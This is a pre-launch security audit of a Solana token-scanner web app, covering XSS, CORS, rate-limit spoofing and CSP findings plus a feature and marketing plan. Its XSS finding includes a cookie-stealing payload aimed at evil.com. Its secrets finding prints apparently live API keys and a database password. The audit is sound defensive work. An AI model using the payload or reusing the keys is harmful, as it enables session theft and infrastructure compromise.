# Scan2Moon — Pre-Launch Production Audit
**Date:** April 29, 2026  
**Auditor:** Full-stack security & Solana specialist review  
**Codebase:** Netlify static site + 40+ serverless functions, Neon Postgres, Upstash Redis, Birdeye API

---

## 1. Executive Summary

**Score: 7.2 / 10**

> Scan2Moon is a technically ambitious, well-architected Solana risk scanner with a mature serverless backend. The Birdeye migration is largely complete and the core scan pipeline is solid. However, **three issues must be fixed before going live**: live production secrets are on disk (rotate all keys now), `mainAnalysis.js` contains an exploitable XSS vulnerability (API data injected unescaped into `innerHTML`), and the admin endpoint broadcasts a wildcard CORS header. Fix these three items and the site is competition-ready.

---

## 2. Security Audit

### 🔴 CRITICAL

---

#### C1 — Live Production Secrets Stored in `.env` on Disk

**File:** `.env`  
**Risk:** If this file is ever committed, pushed, or leaked (e.g. via a misconfigured deployment, IDE sync, accidental `git add .`), **all of your infrastructure is compromised simultaneously.**

The file currently contains:
```
NEON_DATABASE_URL=postgresql://neondb_owner:npg_oeLuTGF09MRD@ep-holy-heart-...
BIRDEYE_API_KEY=f748c7228ff34b268e85271f3626b45b
HELIUS_KEY=b6baca26-222e-4c05-8e04-db0651690662
GEMINI_API_KEY=AQ.Ab8RN6Jw...
GROQ_API_KEY=gsk_gWTlb3qW79wytqelBC2XW...
UPSTASH_REDIS_REST_URL=https://desired-fawn-92181.upstash.io
UPSTASH_REDIS_REST_TOKEN=gQAAAA...
```

The `.gitignore` correctly excludes `.env`, and these are NOT in git history (confirmed). However, the risk is ongoing — one slip is catastrophic.

**Actions required before launch:**

1. **Rotate all keys right now.** Every key in this file should be treated as compromised until confirmed otherwise:
   - Neon: generate new DB password in the Neon dashboard → update connection string
   - Birdeye: regenerate API key in the Birdeye portal
   - Helius: regenerate in Helius dashboard
   - Groq: delete and create a new key
   - Gemini: revoke and create a new key
   - Upstash: rotate the REST token

2. **Set all secrets in Netlify's environment variable UI** (Site settings → Environment variables). Keys set in Netlify are injected at build/runtime and never touch your local disk.

3. **Delete `.env` after migrating to Netlify env vars.** Keep a `.env.example` file with placeholder values:
```bash
NEON_DATABASE_URL=postgresql://user:password@host/db
BIRDEYE_API_KEY=your_birdeye_key_here
HELIUS_KEY=your_helius_key_here
# etc.
```

4. Add a git pre-commit hook to block secrets commits:
```bash
# .git/hooks/pre-commit
if git diff --cached --name-only | grep -q "^\.env$"; then
  echo "ERROR: Attempted to commit .env file. Aborting."
  exit 1
fi
```

---

#### C2 — XSS Vulnerability in `mainAnalysis.js`

**File:** `mainAnalysis.js`, lines 59–77  
**Risk:** A Birdeye-sourced token with a crafted `name`, `symbol`, `mintAuthority`, `freezeAuthority`, `creatorAddress`, or `liquidityStatus` field can inject arbitrary HTML/JS into the page.

**Vulnerable code:**
```javascript
// mainAnalysis.js — ALL of these are unescaped API values inside innerHTML:
document.getElementById("mainAnalysis").innerHTML = `
  <div class="row"><span>Name</span><strong class="value">${name}</strong></div>
  <div class="row"><span>Symbol</span><strong class="value">${symbol}</strong></div>
  <div class="row"><span>Total Supply</span><strong class="value">${totalSupply}</strong></div>
  <div class="row"><span>Market Cap</span><strong class="value">${marketCap}</strong></div>
  <div class="row"><span>Mint Authority</span><strong class="value">${mintAuth}</strong></div>
  <div class="row"><span>Freeze Authority</span><strong class="value">${freezeAuth}</strong></div>
  <div class="row"><span>Creator Wallet</span>
    <strong class="value" ...>${creator}</strong></div>
  <div class="row"><span>Dev Holdings</span><strong class="value">${devPct}</strong></div>
  <div class="row"><span>Liquidity</span><strong class="value">${liquidityStatus}</strong></div>
  ...
  <img src="${logo}" ... />
```

The `esc()` function exists in `utils.js` and is correctly used in `finalScore.js`, but `mainAnalysis.js` never imports or calls it.

**Proof of concept:** A token named `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` would exfiltrate user data when scanned.

**Fix — import and wrap every API value with `esc()`:**

```javascript
// mainAnalysis.js — add this import at the top
import { esc } from "./utils.js";

// Then in the innerHTML template:
document.getElementById("mainAnalysis").innerHTML = `
  <div class="main-analysis">
    <div class="analysis-table">
      <div class="row"><span>Name</span><strong class="value">${esc(name)}</strong></div>
      <div class="row"><span>Symbol</span><strong class="value">${esc(symbol)}</strong></div>
      <div class="row"><span>Total Supply</span><strong class="value">${esc(totalSupply)}</strong></div>
      <div class="row"><span>Market Cap</span><strong class="value">${esc(marketCap)}</strong></div>
      <div class="row"><span>Mint Authority</span><strong class="value">${esc(mintAuth)}</strong></div>
      <div class="row"><span>Freeze Authority</span><strong class="value">${esc(freezeAuth)}</strong></div>
      <div class="row"><span>Creator Wallet</span>
        <strong class="value" style="font-size:10px;word-break:break-all">${esc(creator)}</strong>
      </div>
      <div class="row"><span>Dev Holdings</span><strong class="value">${esc(devPct)}</strong></div>
      <div class="row"><span>Liquidity</span><strong class="value">${esc(String(liquidityStatus))}</strong></div>
    </div>
    <div class="token-logo-frame">
      <img src="${esc(logo)}" referrerpolicy="no-referrer"
           onerror="this.src='https://placehold.co/80x80'" />
    </div>
  </div>
`;
```

Also audit `script.js` (the `renderDevHistory` function) — values like `creator`, `devPercent`, `shortCreator` flow into `innerHTML` templates. Most are wrapped with `esc()` already in that file, but double-check every interpolation.

---

#### C3 — Admin Endpoint Uses Wildcard CORS

**File:** `netlify/functions/adminKey.js`, line ~12  
**Risk:** The admin endpoint that can create/revoke/delete API keys and view all user emails accepts requests from **any origin**.

```javascript
// CURRENT (dangerous):
const CORS = {
  "Access-Control-Allow-Origin": "*",  // ← any website can hit this
  ...
};
```

Even with `X-Admin-Secret` auth, a wildcard CORS header on an admin endpoint allows cross-site requests from attacker-controlled pages when combined with CSRF-like attacks. It also exposes the endpoint in browser-side error messages.

**Fix:**
```javascript
// netlify/functions/adminKey.js
const CORS = {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": process.env.ALLOWED_ORIGIN || "https://scan2moon.com",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, X-Admin-Secret",
};
```

The admin panel (`admin.html`) is served from your own domain, so this origin lock won't break anything.

---

### 🟠 HIGH

---

#### H1 — Birdeye API Key Exposed to Browser via `birdeyeWsKey`

**File:** `netlify/functions/birdeyeWsKey.js`  
**Risk:** Returns `{ ok: true, key: "f748c7228ff34..." }` to any browser that calls it (rate limited to 5/min per IP, but any user can still retrieve and abuse your Birdeye key for quota exhaustion attacks).

The code acknowledges this: *"harden post-competition by rotating to a restricted 'WS-only' key."* This is an acceptable trade-off for the competition window. **After the competition ends, do this immediately:**

1. Create a dedicated Birdeye WebSocket-only API key in the Birdeye portal (different key than your REST key)
2. Rotate the REST key (`BIRDEYE_API_KEY`) to a new value
3. The WS key can remain exposed (it can only subscribe to price streams, not make REST calls)

For the competition, consider adding an Origin header check as a secondary guard:
```javascript
// birdeyeWsKey.js — add after OPTIONS check
const origin = event.headers["origin"] || "";
if (origin && origin !== (process.env.ALLOWED_ORIGIN || "https://scan2moon.com")) {
  return { statusCode: 403, headers: CORS,
           body: JSON.stringify({ ok: false, error: "Forbidden" }) };
}
```

---

#### H2 — IP Rate Limiters Vulnerable to `x-forwarded-for` Spoofing

**Files:** All Netlify functions using `isRateLimitedRedis()`  
**Current code:**
```javascript
const ip = (event.headers["x-forwarded-for"] || "").split(",")[0].trim() || "unknown";
```

`x-forwarded-for` is a user-controlled header. An attacker can bypass rate limits by setting `X-Forwarded-For: 1.2.3.4` in their request.

**Fix:** Use `x-nf-client-connection-ip` (Netlify's trusted header, not spoofable) with `x-forwarded-for` as fallback only:
```javascript
// db.js — update the extractIp helper (or add it):
function extractIp(event) {
  return (
    event.headers["x-nf-client-connection-ip"] ||  // Netlify-set, not spoofable
    (event.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    "unknown"
  );
}
```

Note: `stats.js` already correctly uses `x-nf-client-connection-ip` as the primary — propagate this pattern to all other functions.

---

#### H3 — CSP `unsafe-inline` Undermines XSS Protection

**File:** `netlify.toml`, line 31  
**Current:**
```toml
script-src 'self' 'unsafe-inline' cdn.jsdelivr.net unpkg.com;
```

`unsafe-inline` allows all `<script>` tags and inline event handlers, completely defeating the XSS protection that CSP is supposed to provide. The fix (C2 above) is more urgent, but this is defence-in-depth.

**Recommended approach for post-launch:** Use a nonce-based CSP. Netlify Edge Functions can inject a per-request nonce:
```toml
# netlify.toml — remove 'unsafe-inline', add nonce support
Content-Security-Policy = "default-src 'self'; script-src 'self' 'nonce-{nonce}' cdn.jsdelivr.net unpkg.com; ..."
```

For the competition launch, a pragmatic intermediate step is to at minimum add SRI hashes to your CDN dependencies:

```html
<!-- index.html — add integrity attribute to bs58 import -->
<script type="importmap">
  { "imports": { "bs58": "https://cdn.jsdelivr.net/npm/bs58@5.0.0/+esm" } }
</script>
```

Generate SRI with `generate-sri.sh` (you already have this file — run it).

---

#### H4 — No SRI on External CDN Scripts

**File:** `index.html` and other HTML pages  
Any CDN-served script (bs58, html2canvas, etc.) without SRI can be replaced by the CDN provider or a MITM attacker with malicious code. Your `generate-sri.sh` exists — **run it before launch** and add the `integrity` attributes to every CDN `<script>` tag.

---

### 🟡 MEDIUM

---

#### M1 — `selfServeKey.js` CORS Wildcard

**File:** `netlify/functions/selfServeKey.js`  
Same issue as C3 — this endpoint creates database entries and should restrict its CORS origin. While less sensitive than the admin endpoint, wildcard CORS here means any website can silently generate API keys on behalf of your users (CSRF-style).

```javascript
// Fix:
"Access-Control-Allow-Origin": process.env.ALLOWED_ORIGIN || "https://scan2moon.com",
```

---

#### M2 — `holders.js` Uses `innerHTML +=` in a Loop

**File:** `holders.js`, lines 54–63  
```javascript
holders.slice(0, 15).forEach((h, i) => {
  const owner = h.owner ?? "Unknown";
  container.innerHTML += `...${owner}...`;  // ← += in a loop
});
```

`innerHTML +=` in a loop is both a performance issue (re-parses the entire DOM tree on each iteration) and a potential security issue (the `owner` field from Birdeye is not escaped). Replace with `insertAdjacentHTML`:

```javascript
// holders.js — fix
container.innerHTML = "";
const fragment = holders.slice(0, 15).map((h, i) => {
  const owner = h.owner ?? "Unknown";
  return `
    <div class="holder-row">
      <span>#${i + 1}</span>
      <a href="https://solscan.io/account/${esc(owner)}" target="_blank"
         rel="noopener noreferrer" class="holder-link">
        ${esc(owner.slice(0, 4))}…${esc(owner.slice(-4))}
      </a>
      <span>${esc(Number(h.percentage).toFixed(2))}%</span>
      <span>${esc(formatAmount(h.uiAmount))}</span>
    </div>
  `;
}).join("");
container.insertAdjacentHTML("beforeend", fragment);
```

---

#### M3 — Global State Via `window.scan*` Variables Creates Race Conditions

**Files:** `script.js`, `mainAnalysis.js`, `scanSignals.js`, `finalScore.js`  
The entire scan pipeline communicates via global `window.*` properties (`window.scanResult`, `window.scanMint`, `window.scanCreator`, `window.scanIsPumpFun`, etc.). If a user scans token A then quickly scans token B, there's a real risk of panels from scan A mixing with data from scan B, producing nonsensical risk scores.

**Short-term fix:** Add a scan-session ID to guard against stale async callbacks:
```javascript
// script.js — generate a unique ID per scan
window.currentScanId = Date.now().toString(36);
const thisScanId = window.currentScanId;

// In every async callback before writing window.*:
if (window.currentScanId !== thisScanId) return; // stale — abort
```

**Long-term:** Refactor to pass a `scanContext` object through the call chain instead of using globals.

---

#### M4 — `stats.js` `body.type` Not Validated Against Whitelist

**File:** `netlify/functions/stats.js`  
The `body.type` is used to look up a Redis key via `RK[body.type]`. While `RK` only has four known keys, the absence of an explicit whitelist check means unexpected values silently fall through. Add an explicit guard:

```javascript
const VALID_TYPES = new Set(["visit", "scan", "share", "moon"]);
if (event.httpMethod === "POST" && !VALID_TYPES.has(body.type)) {
  return respond(400, { error: "Invalid type" });
}
```

---

### 🟢 LOW

---

#### L1 — JS/CSS Cache-Control is Only 5 Minutes

**File:** `netlify.toml`  
```toml
Cache-Control = "public, max-age=300, stale-while-revalidate=86400"
```

300 seconds (5 min) for static JS/CSS is far too short. Your JS files don't have content-hash filenames, so you can't use immutable caching, but 5 minutes means frequent re-downloads for returning users. Consider `max-age=3600` (1 hour) for the competition period — your redeploys are infrequent enough that this won't cause stale-code issues.

---

#### L2 — `ohlcvData.js.orig` Committed to Repo

**File:** `netlify/functions/ohlcvData.js.orig`  
A `.orig` backup file is present in the functions directory. Netlify may try to deploy this as a function. Delete it:
```bash
rm netlify/functions/ohlcvData.js.orig
```

---

#### L3 — `node_modules` Appears in Untracked Files

The `git status` output shows `node_modules/` subdirectories as untracked. Verify your `.gitignore` has `node_modules/` and that it's not partially tracked.

---

## 3. Birdeye Data Integration Strategy

### Current Birdeye Endpoint Usage (Confirmed Active)

You are already using Birdeye extensively. Here's what's live:

| Endpoint | Used In | Calls/Scan |
|---|---|---|
| `/defi/token_overview` | scanToken, tokenData, holderData, tokenSecurity | 4 |
| `/defi/price` | scanToken, tokenData | 2 |
| `/defi/token_security` | tokenSecurity | 1 |
| `/defi/token_creation_info` | scanToken (phase 2) | 1 |
| `/defi/v2/markets` | scanToken (phase 2) | 1 |
| `/defi/v3/token/holder` | holderData | 1 |
| `/defi/ohlcv` | ohlcvData (chart) | 1 per candle load |
| `/defi/tokenlist` | topGainers (×3 pages), detectNewPairs (×2 sorts) | 5 |
| `/defi/multi_price` | topGainers (×N chunks of 30) | 3-5 |
| WebSocket price stream | birdeye-ws.js | continuous |

**Estimated Birdeye calls per active session:** ~20-25 calls for a single full token scan. With the scheduled functions running every 2 minutes (detectNewPairs, warmCache), you're generating ongoing background traffic.

### Missing High-Value Birdeye Endpoints

These are the endpoints you should add immediately for competition impact:

#### Priority 1 — Add to Existing Features

**A. Token Trade History** — adds real "smart money watching this" signals
```javascript
// netlify/functions/tradeHistory.js (new)
// GET /defi/txs/token?address=<mint>&tx_type=swap&offset=0&limit=50
const res = await fetch(
  `https://public-api.birdeye.so/defi/txs/token?address=${mint}&tx_type=swap&offset=0&limit=50`,
  { headers: { "X-API-KEY": KEY, "x-chain": "solana" }, signal: AbortSignal.timeout(8000) }
);
// Returns: { items: [{ owner, side, uiAmount, usdAmount, txHash, blockUnixTime }] }
// Surface: whale transactions panel on the risk scanner result page
```

**B. Trending Tokens** — perfect for a "What's hot right now" widget
```javascript
// netlify/functions/trending.js (new)
// GET /defi/token_trending?sort_by=rank&sort_type=asc&offset=0&limit=20
const res = await fetch(
  `https://public-api.birdeye.so/defi/token_trending?sort_by=rank&sort_type=asc&offset=0&limit=20`,
  { headers: { "X-API-KEY": KEY, "x-chain": "solana" }, signal: AbortSignal.timeout(8000) }
);
// Returns: ranked list of trending tokens with price, MC, volume
// Surface: home page "Trending Now" section — instant competition eye-candy
```

**C. Wallet Portfolio View** — enables "scan my wallet for risky tokens" feature
```javascript
// netlify/functions/walletRisk.js (new — extends existing walletTokens.js)
// GET /v1/wallet/token_list?wallet=<address>&offset=0&limit=100
const res = await fetch(
  `https://public-api.birdeye.so/v1/wallet/token_list?wallet=${wallet}`,
  { headers: { "X-API-KEY": KEY, "x-chain": "solana" }, signal: AbortSignal.timeout(10000) }
);
// Then run a quickRisk() score on each token in the wallet
// Surface: "Portfolio Risk Scan" — scan your whole wallet for rugs at once
```

**D. Top Traders / Smart Money** — differentiates you from all other scanners
```javascript
// netlify/functions/smartTraders.js (new)
// GET /defi/v2/tokens/{address}/top_traders?time_frame=24h&sort_by=volume&sort_type=desc
const res = await fetch(
  `https://public-api.birdeye.so/defi/v2/tokens/${mint}/top_traders?time_frame=24h&sort_by=volume&sort_type=desc&offset=0&limit=10`,
  { headers: { "X-API-KEY": KEY, "x-chain": "solana" }, signal: AbortSignal.timeout(8000) }
);
// Returns: top wallet addresses trading this token in last 24h
// Surface: "Smart Money Activity" panel on scan results
```

#### Priority 2 — New Standalone Features

**E. Price History** for portfolio P&L
```javascript
// GET /defi/history_price?address=<mint>&address_type=token&type=15m&time_from=<ts>&time_to=<ts>
```

**F. Pair Overview** for DEX-level liquidity detail
```javascript
// GET /defi/v3/pair/overview/single?address=<pair_address>
```

**G. Token List New Launches** (complementary to your detectNewPairs)
```javascript
// GET /defi/tokenlist?sort_by=v24hUSD&sort_type=desc&min_liquidity=500&limit=50
// Already used — add a dedicated "Recently Launched" sort with min_liquidity=200 and age filter
```

### Minimum 50 API Calls Strategy for Competition

To hit 50+ meaningful Birdeye API calls and qualify for prizes, here's a concrete daily flow:

| Feature | Calls | Frequency |
|---|---|---|
| Token scan (full) — 6 Birdeye calls each | 6 | Per user scan |
| Holder data fetch | 2 | Per scan |
| OHLCV chart load (3 timeframes) | 3 | Per chart view |
| topGainers refresh (3 pages + multi_price chunks) | 8 | Every 90s cache miss |
| detectNewPairs scheduled (×2 sorts + enrichment) | 12 | Every 2 min |
| warmCache (covers 10 watchlist tokens × overview) | 10 | Every 2 min |
| trending endpoint | 1 | Every 2 min |
| **Total per active user session (15 min)** | **~50+** | ✅ |

Add the `tradeHistory` and `smartTraders` endpoints (E above) and you're easily hitting 80-100 calls per engaged session.

### Concrete Migration Plan

**Phase 1 (do this week — competition differentiators):**
1. Add `trending.js` function → surface on home page
2. Add `tradeHistory.js` function → "Recent Whale Trades" panel on scan results  
3. Add `smartTraders.js` function → "Smart Money" signal on scan results
4. Add `walletRisk.js` function → "Scan My Wallet" CTA on the home page

**Phase 2 (week 2 — depth features):**
5. Integrate `/defi/v3/pair/overview/single` for DEX pair detail
6. Add price history sparklines to the watchlist using `/defi/history_price`
7. Surface Birdeye WebSocket for real-time price ticks on the scan result page

**Phase 3 (week 3-4 — AI + competition finale):**
8. Feed `tradeHistory` data into Sentinel (Groq/Llama) for "pattern detected" insights
9. Build a "New Token Radar" page using trending + detectNewPairs combined
10. Add a live "Whale Alert" feed using trade history for large-value swaps (> $50K)

---

## 4. Code Quality & Architecture Review

### Performance Bottlenecks

**P1 — Scan pipeline is sequential in `script.js`**  
The render functions are called one after another. The scan result panels (mainAnalysis, signals, holders, marketCap, finalScore) could all fire in parallel since they each independently fetch from different serverless endpoints:

```javascript
// script.js — parallelise the panel renders
await Promise.allSettled([
  renderMainAnalysis(mint),
  renderSignals(mint),      // already fetches scanToken internally
  renderHolders(mint),
  renderMarketCap(mint),
  renderBundlePanel(mint),
]);
// Only finalScore needs to wait (it reads window.scanResult set by renderSignals)
await renderFinalScore();
```

**P2 — `topGainers.js` fetches 3 Birdeye pages in parallel (good) but chunks multi_price serially**  
The `multi_price` enrichment loop is sequential (`for` loop with `await`). Parallelise it:
```javascript
// topGainers.js — parallel chunk fetch
const chunks = [];
for (let i = 0; i < addrs.length; i += CHUNK) chunks.push(addrs.slice(i, i + CHUNK));
const results = await Promise.allSettled(chunks.map(chunk => fetchChunk(chunk)));
```

**P3 — `warmCache` runs every 2 minutes — verify it's not hammering Birdeye**  
Confirm the cache TTL in Redis (90s for scanToken) is actually preventing Birdeye calls on warm cache hits. If warmCache fires every 120s and the TTL is 90s, there's a 30s window every cycle where Birdeye gets hit. Consider raising `REDIS_TTL` in `scanToken.js` to 130s.

### Error Handling & UX Resilience

**Good:** The `scanToken.js` stale-Neon fallback is excellent — users see something even when Birdeye quota is exhausted. The Redis → Neon → Birdeye layered cache is well thought out.

**Missing:** When `renderMainAnalysis` throws (e.g. Birdeye 502), the error is caught in `script.js` but the user sees a blank panel with no explanation. Add user-facing error states:
```javascript
// script.js — better error UI
try {
  await renderMainAnalysis(mint);
} catch (e) {
  document.getElementById("mainAnalysis").innerHTML =
    `<div class="panel-error">⚠️ Token data unavailable — ${esc(e.message)}</div>`;
}
```

### Code Organization

**Good:** The separation of concerns is solid — each Netlify function has a single responsibility, the `db.js` shared module is clean, and decommissioned endpoints return proper `410 Gone` responses.

**Improvement area:** The frontend module structure is sound (ES modules with named exports), but `scanSignals.js` is 600+ lines. Consider splitting the signal scoring functions into a separate `signals/` directory.

### Mobile Responsiveness

Spot-checking `risk-scanner.html` and `style.css` — the site appears to use CSS custom properties and flexbox throughout, which is good. No obvious breakpoint issues from a static read. **Recommend testing on actual iOS Safari and Android Chrome before launch**, as WebSocket connections behave differently on mobile networks.

### Best Practices Violations

- **Inconsistent error logging:** Some functions use `console.log`, some `console.warn`, some `console.error` for the same category of errors. Standardise: use `console.error` for caught exceptions, `console.warn` for degraded-mode fallbacks, `console.log` for normal operational events.
- **Magic numbers:** `REDIS_TTL = 90` appears in multiple functions without a shared constant. Extract to `db.js` as `DEFAULT_CACHE_TTL`.
- **`var` in newer functions:** `adminKey.js` and `apiKey.js` use `var` throughout. Not harmful but inconsistent with the rest of the codebase which uses `const`/`let`.

---

## 5. Competition Optimization Plan

### Positioning Strategy

Scan2Moon's strongest differentiator in the Birdeye Build in Public Competition is **depth of Birdeye integration across a complete user workflow** — not just a single feature. Frame every post around "here's a problem traders face → here's how Birdeye data solves it → here's Scan2Moon making it one-click."

**Your four scoring categories:**

**Community Support (X engagement)**
- Post a scan of a trending token every morning using your own tool. Show the output. Tag @birdeye_so.
- Create a "Token of the Day" post: scan result card + Sentinel AI verdict + 1 insight from whale trade history data
- Run a weekly "Most Dangerous Meme Coin This Week" post using your topGainers + risk scorer
- Reply to anyone posting about token rugs with "We scanned that — here's what the data showed"

**Product Utility**
- The Wallet Risk Scanner ("scan my whole wallet for rugs") is your killer utility feature — it's the one thing no other tool does as a one-click experience
- The New Token Radar (detectNewPairs + risk scoring + smart money overlay) is your second utility pillar
- Both features are powered entirely by Birdeye — make this explicit in the UI and posts

**Technical Depth**
- Publish a Twitter thread explaining your 3-layer cache (Redis → Neon → Birdeye) and why it matters for real-time scanning
- Show the Birdeye WebSocket implementation in a code snippet thread
- Document your signal scoring system as a public GitHub gist — shows technical rigor

**Presentation (GitHub + Demo Video)**
- Your `README.md` is already comprehensive (added in recent commits) — good
- Demo video script: "I find a new token on X → paste address → 3 seconds → full risk score with whale trades, holder concentration, LP strength, Sentinel AI verdict"
- Show the New Token Radar finding a token before it pumps (with timestamps)

### New Features to Build for the Competition

**Feature 1: "Wallet Risk Radar"** (1-2 days to build)
- Input: Solana wallet address
- Fetches: `/v1/wallet/token_list` from Birdeye → runs quickRisk() on each token
- Output: Portfolio health score, list of risky tokens to watch/sell, total exposure estimate
- Why it wins: No existing tool does this with Birdeye-backed risk scoring

**Feature 2: "Whale Alert Feed"** (1 day to build)
- Combines: `/defi/txs/token` for your watchlist tokens
- Shows: Real-time large swaps (> $10K) as they happen via WebSocket
- Filter: Smart money wallets identified by your existing `detectSmartMoney.js`
- Why it wins: Directly demonstrates Birdeye's transaction data depth

**Feature 3: "Token Safety Radar" home widget** (half day to build)
- Combines: `/defi/token_trending` + your existing `batchRisk.js` risk scorer
- Shows: Top 10 trending tokens right now with colour-coded risk scores
- Auto-refreshes every 60 seconds
- Why it wins: Compelling visual, proves real-time Birdeye integration, shareable

### Build-in-Public X Strategy — This Week

**Day 1 (launch day):** "Scan2Moon is live. Built on Birdeye data. Here's how it works — a thread 🧵" → show the scan pipeline, the risk signals, the Sentinel AI verdict

**Day 2:** Scan a trending token live. Show the output. Show what the whale trades look like. "Here's what smart money is actually doing on [TOKEN]"

**Day 3:** "We built a wallet scanner. Paste your wallet → see every risky token you're holding, scored by Birdeye data." (if feature is ready) — this post will go viral in the degen community

**Day 4:** Technical post: "Our New Token Radar found [X TOKEN] 4 minutes after launch. Here's the Birdeye data that flagged it." Show the detectNewPairs output + timestamp

**Day 5:** Community engagement: "What token should we scan next? Drop your calls below." Reply to every comment with a scan result card image

**Weekend:** "Week 1 stats — X scans, X tokens detected, X rugs flagged." Show growth graphs.

---

## 6. Final Launch Checklist

### Must Fix Before Flipping to Live

- [ ] **C1: Rotate all secrets** — NEON, BIRDEYE, HELIUS, GEMINI, GROQ, UPSTASH. Delete `.env` after migrating to Netlify env vars panel.
- [ ] **C2: Fix XSS in `mainAnalysis.js`** — import `esc()` and wrap `name`, `symbol`, `logo`, `mintAuth`, `freezeAuth`, `creator`, `devPct`, `totalSupply`, `marketCap`, `liquidityStatus` in `innerHTML` templates.
- [ ] **C3: Lock CORS on `adminKey.js`** — change `"*"` to `process.env.ALLOWED_ORIGIN`.
- [ ] **L2: Delete `netlify/functions/ohlcvData.js.orig`** — stray file that may cause a deploy error.
- [ ] **L3: Confirm `node_modules/` is not partially tracked in git** — run `git check-ignore -v node_modules` and ensure clean `.gitignore`.
- [ ] **Run `generate-sri.sh`** — add SRI integrity hashes to all CDN scripts in HTML files.

### Should Fix This Week (High Value, Low Effort)

- [ ] **H2: Use `x-nf-client-connection-ip` as primary IP source** in all Netlify functions (copy pattern from `stats.js`).
- [ ] **M1: Lock CORS on `selfServeKey.js`** — change `"*"` to allowed origin.
- [ ] **M2: Fix `innerHTML +=` loop in `holders.js`** — use single `insertAdjacentHTML` call with `esc()` on all owner values.
- [ ] **M3: Add scan session ID guard** to prevent race conditions when scanning tokens in quick succession.
- [ ] **M4: Whitelist `body.type` in `stats.js`** — explicit check against `["visit","scan","share","moon"]`.

### Competition Enhancements (This Sprint)

- [ ] Add `trending.js` Netlify function (Birdeye `/defi/token_trending`) + render on home page
- [ ] Add `tradeHistory.js` Netlify function + "Recent Whale Trades" panel on scan results
- [ ] Add `walletRisk.js` function + "Scan My Wallet" feature (biggest competition differentiator)
- [ ] Add `smartTraders.js` + "Smart Money Activity" panel on scan results
- [ ] Raise `REDIS_TTL` in `scanToken.js` to 130s (fixes warmCache timing gap)
- [ ] Parallelise panel renders in `script.js` with `Promise.allSettled`
- [ ] Add user-facing error states to all scan panels (replace silent blank panels)

### Deployment Verification

After deploying, verify these manually:
- [ ] `/.env` returns 404 (netlify.toml redirect is in place ✅)
- [ ] `/.netlify/functions/scanToken?mint=So11111111111111111111111111111111111111112` returns valid data
- [ ] `/.netlify/functions/adminKey` without `X-Admin-Secret` returns 401 (not 500)
- [ ] `/.netlify/functions/birdeyeWsKey` returns a key (rate limit test: 6 rapid calls should get a 429)
- [ ] Redis cache headers: check `X-Cache: HIT` on second scan of same token
- [ ] Sentinel AI returns a valid JSON verdict for a test scan
- [ ] CSP headers are present: check `curl -I https://scan2moon.com | grep -i content-security`

---

*Audit complete. Three critical issues are blocking launch (C1, C2, C3). Fix those first — everything else can ship in the first week post-launch.*
